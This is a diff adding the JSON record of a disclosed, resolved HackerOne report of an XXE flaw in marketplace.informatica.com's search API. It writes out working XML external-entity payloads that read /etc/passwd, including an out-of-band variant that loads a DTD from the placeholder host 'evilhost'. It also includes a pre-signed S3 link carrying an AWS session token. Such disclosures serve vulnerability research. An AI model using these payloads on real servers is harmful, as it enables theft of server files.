@@ -1,0 +1,126 @@
+{
+  "id": 106797,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY3OTc=",
+  "url": "https://hackerone.com/reports/106797",
+  "title": "[marketplace.informatica.com] - XXE",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2015-12-24T18:17:17.892Z",
+  "submitted_at": "2015-12-24T18:17:17.892Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yarbabin",
+    "url": "/yarbabin",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/SykMJ5yEdYSnUWp5QeiegjZn/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 453,
+    "url": "https://hackerone.com/informatica",
+    "handle": "informatica",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Informatica",
+      "twitter_handle": "informatica",
+      "website": "https://www.informatica.com/",
+      "about": "Informatica Corporation is the world’s number one independent provider of data integration software."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2016-12-09T08:06:26.920Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-11-09T08:06:17.279Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Request:\n`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`\n`Host: marketplace.informatica.com`\n`Connection: keep-alive`\n`Content-Length: 140`\n`Accept: */*`\n`X-J-Token: no-user`\n`X-Requested-With: XMLHttpRequest`\n`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`\n`Origin: https://marketplace.informatica.com`\n`Content-Type: application/json`\n`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`\n`Accept-Encoding: gzip, deflate`\n`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`\n\n`{\"params\":{\"source\":\"marketplace\",\"rows\":5,\"offset\":0,\"queryParams\":{\"query\":\"lol\",\"fieldList\":\"[\\\"id\\\", \\\"title\\\"]\",\"sortBy\":\"relevance\"}}}`\n\nBut, if we change content-type to application/xml and convert JSON to XML:\n`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`\n`Host: marketplace.informatica.com`\n`Connection: keep-alive`\n`Content-Length: 350`\n`Accept: */*`\n`X-J-Token: no-user`\n`X-Requested-With: XMLHttpRequest`\n`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`\n`Origin: https://marketplace.informatica.com`\n`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`\n`Accept-Encoding: gzip, deflate`\n`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`\n`Content-Type: application/xml;charset=UTF-8`\n\n`<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>`\n`<!DOCTYPE foo [  `\n`<!ELEMENT foo ANY >`\n`<!ENTITY xxe SYSTEM \"file:///etc/passwd1\" >]>`\n`<params>`\n`<offset>0</offset>`\n`<queryParams>`\n`<query>&xxe;</query>`\n`<sortBy>relevance</sortBy>`\n`<fieldList>[\"id\", \"title\"]</fieldList>`\n`</queryParams>`\n`<source>marketplace</source>`\n`<rows>5</rows>`\n`</params>`\n\nI get response: `JAXBException occurred : /etc/passwd1 (No such file or directory). /etc/passwd1 (No such file or directory). `\n\nThen, i try to get /etc/passwd with OOB vector:\n`POST /api/rest/mpapi/infaMPAPISearchWebService/query HTTP/1.1`\n`Host: marketplace.informatica.com`\n`Connection: keep-alive`\n`Content-Length: 350`\n`Accept: */*`\n`X-J-Token: no-user`\n`X-Requested-With: XMLHttpRequest`\n`User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36`\n`Origin: https://marketplace.informatica.com`\n`Referer: https://marketplace.informatica.com/ecmp-helper!troubleLogin.jspa`\n`Accept-Encoding: gzip, deflate`\n`Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4`\n`Content-Type: application/xml;charset=UTF-8`\n\n`<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?>`\n`<!DOCTYPE foo [  `\n`<!ENTITY % b SYSTEM \"file:///etc/passwd\">`\n`<!ENTITY % asd SYSTEM \"http://evilhost/xx.html\">  %asd;  %rrr;]>`\n`<params>`\n`<offset>0</offset>`\n`<queryParams>`\n`<query>&xxe;</query>`\n`<sortBy>relevance</sortBy>`\n`<fieldList>[\"id\", \"title\"]</fieldList>`\n`</queryParams>`\n`<source>marketplace</source>`\n`<rows>5</rows>`\n`</params>`\n\nAnd I got it :) ",
+  "weakness": {
+    "id": 58,
+    "name": "Command Injection - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 66691,
+      "file_name": "xxe_infor.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/066/691/67792ad553a4ffa4dd7eaf4f5dc03e1dd720833a/xxe_infor.png?response-content-disposition=attachment%3B%20filename%3D%22xxe_infor.png%22%3B%20filename%2A%3DUTF-8%27%27xxe_infor.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUPHDD546%2F20250922%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250922T001951Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDKsPnwqCh%2FQVaYDYBUsS0icgjcq6yVbEhVYiPJ8ea6FAIgQQ%2BaH%2BfucKthmW9uPJOom68SV7d2Q2FsHrZP7Kr7Q%2FsqsgUIHxADGgwwMTM2MTkyNzQ4NDkiDD0NRkW8orxYL9wKPSqPBV%2F3ezcQmvJbd6s6%2FGKhrbA8tkrzOyBzRNRt6Ms%2BR50M4de2dwuKzmuc%2BE4RRqJDtOiCFWvLWvDSXMfupaVlrMx0koUXpbBvs4KEMKN7X1EA0IMBNnyFh3%2FrfVDP8naoHI4nOhB2PRDLbOf4wMP5BcWxdI2cheJ6KYnapAdfAZhx%2BrBS4Nxx9RownzMDPX%2B7FC8d3n5x%2Fbjhh76VR0P0VszjsR3XemeIXxNhCK%2BLTurR2DFLHqVhx7BpZTaNquXMwgJHk7%2BspxXsArpigqdcxQYFivR77vF7VUjr4bqGtNOvF%2FxnFvwvfzqlB4TaWjh3sB9rXJtkWHgBr3qXVIFs%2BjXnQEaQrin9FakszLpMRSgyrxg70Rbf5H48vkBmFCedGpnnshzQwA7RzzMnTxYsdV1PJKYoFOAea%2BZXFahm5ZNSf0Xj23uz6wLELyMKTg0gjqEtJUz9M13rwVgBQleRZhdkMon%2Bw1PAAhD21QpJyhzEUKffruc6C6lFZz%2FojE3gRaCRWzSfrDdCuRgMIuH1Ti56YzOi6SZj2%2Bj%2FJGKM2pnfXyDZWU7E5uXQtL%2FBuYWD%2F1gbpV0%2FMoSUFWLsrBIJ3Ar%2B0jUZPxvVR05CIafGtMXK2G1x9kYgcIW1mP5H3wi0S6tS40u%2Byecwaf00qgf%2FkjJudj1uaCZaaZdxWtPTZ3haFAKWaUtOb3q%2F%2FLBEC7F7tFYukvjf8tiCwi4uWzRmTya3mRIMX8ONMgCeKln2ggoC0kK%2BXBp2DZHbly4H%2Bqt3dAaXi831U3bujY7bO%2BMcE0Wkc9pzp55bhE1R4zAJy1iw%2BbdKoqnYfYfX48YFpLXaeBvpU3Eu9d00cgLamHUG8nqitJXQXHbPT8lF8wGtxqEwle3BxgY6sQH5vvI1HWOFPwg4t5LVLyhmy%2BFJ37N8Sf6VG77h8lIZ8Btwm0KcD%2BfYJW1s2fynRGJebyKkuBnM3yHjNo4%2F%2FuxmuBgBwKz9G72zYtSlFCOrb8gFDGNLHV4ITKYTCI3f8Ozj7gw2NJMIkph4GZ5kpYT7fSpFkXYvBB7ADdb738O1jsE35vz48OTRzQ%2BqvxFxNbQQquxi0XkZ7WOQdTaqqqNl3WjuB6BjRKXNh%2FU0nvVpRyI%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=360bbf9521ebfa73f42c9fc8d06fe60f7082d0727b2e80f2b7028ece684ae357",
+      "file_size": 349008,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-12-09T08:06:17.314Z",
+  "allow_singular_disclosure_after": -277229614.1809541,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "hunter",
+    "b6117130df17feef13481e3",
+    "spam404",
+    "xsstestov",
+    "encrypt",
+    "mpz",
+    "eveeez",
+    "zuh4n",
+    "alfredsaonoy",
+    "sumit7",
+    "and 3 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
